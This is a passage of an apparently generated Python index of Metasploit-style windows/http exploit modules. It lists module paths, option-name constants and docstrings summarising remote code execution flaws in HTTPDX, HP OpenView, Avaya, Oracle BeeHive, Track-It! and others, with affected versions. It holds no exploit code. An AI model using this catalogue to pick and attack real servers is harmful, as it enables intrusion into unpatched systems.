			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_httpdx_tolog_format(object):
		"""
		
          This module exploits a format string vulnerability in HTTPDX HTTP server.
        By sending an specially crafted HTTP request containing format specifiers, an
        attacker can corrupt memory and execute arbitrary code.

        By default logging is off for HTTP, but enabled for the 'moderator' user
        via FTP.
      
		"""

		path = 'windows/http/httpdx_tolog_format'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_hp_nnm_getnnmdata_icount(object):
		"""
		
          This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53.
        By sending specially crafted ICount parameter to the getnnmdata.exe CGI,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_getnnmdata_icount'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_avaya_ccr_imageupload_exec(object):
		"""
		
          This module exploits an authentication bypass vulnerability on Avaya IP Office
        Customer Call Reporter, which allows a remote user to upload arbitrary files
        through the ImageUpload.ashx component. It can be abused to upload and execute
        arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP
        Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2.
      
		"""

		path = 'windows/http/avaya_ccr_imageupload_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_TARGETURI = 'TARGETURI'

	class windows_http_httpdx_handlepeer(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The
        vulnerability is caused due to a boundary error within the "h_handlepeer()" function in http.cpp.
        By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code.
      
		"""

		path = 'windows/http/httpdx_handlepeer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_sybase_easerver(object):
		"""
		
          This module exploits a stack buffer overflow in the Sybase EAServer Web
        Console. The offset to the SEH frame appears to change depending
        on what version of Java is in use by the remote server, making this
        exploit somewhat unreliable.
      
		"""

		path = 'windows/http/sybase_easerver'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_DIR = 'DIR'

	class windows_http_oracle_beehive_prepareaudiotoplay(object):
		"""
		
        This module exploits a vulnerability found in Oracle BeeHive. The prepareAudioToPlay method
        found in voice-servlet can be abused to write a malicious file onto the target machine, and
        gain remote arbitrary code execution under the context of SYSTEM. Authentication is not
        required to exploit this vulnerability.
      
		"""

		path = 'windows/http/oracle_beehive_prepareaudiotoplay'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'

	class windows_http_hp_nnm_getnnmdata_maxage(object):
		"""
		
          This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53.
        By sending specially crafted MaxAge parameter to the getnnmdata.exe CGI,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_getnnmdata_maxage'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_openview_insight_backdoor(object):
		"""
		
          This module exploits a hidden account in the com.trinagy.security.XMLUserManager Java
        class. When using this account, an attacker can abuse the
        com.trinagy.servlet.HelpManagerServlet class and write arbitary files to the system
        allowing the execution of arbitary code.

        NOTE: This module has only been tested against HP OpenView Performance Insight Server 5.41.0
      
		"""

		path = 'windows/http/hp_openview_insight_backdoor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'

	class windows_http_edirectory_host(object):
		"""
		
          This module exploits a stack buffer overflow in Novell eDirectory 8.8.1.
        The web interface does not validate the length of the
        HTTP Host header prior to using the value of that header in an
        HTTP redirect.
      
		"""

		path = 'windows/http/edirectory_host'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_badblue_passthru(object):
		"""
		
          This module exploits a stack buffer overflow in the PassThru
        functionality in ext.dll in BadBlue 2.72b and earlier.
      
		"""

		path = 'windows/http/badblue_passthru'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_webster_http(object):
		"""
		
          This exploits a stack buffer overflow in the Webster HTTP server.
          The server and source code was released within an article from
          the Microsoft Systems Journal in February 1996 titled "Write a
          Simple HTTP-based Server Using MFC and Windows Sockets".
      
		"""

		path = 'windows/http/webster_http'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_trackit_file_upload(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability in Numara / BMC Track-It!
        v8 to v11.X.
        The application exposes the FileStorageService .NET remoting service on port 9010
        (9004 for version 8) which accepts unauthenticated uploads. This can be abused by
        a malicious user to upload a ASP or ASPX file to the web root leading to arbitrary
        code execution as NETWORK SERVICE or SYSTEM.
        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
        10.0.0.143, 9.0.30.248 and 8.0.2.51.
      
		"""

		path = 'windows/http/trackit_file_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
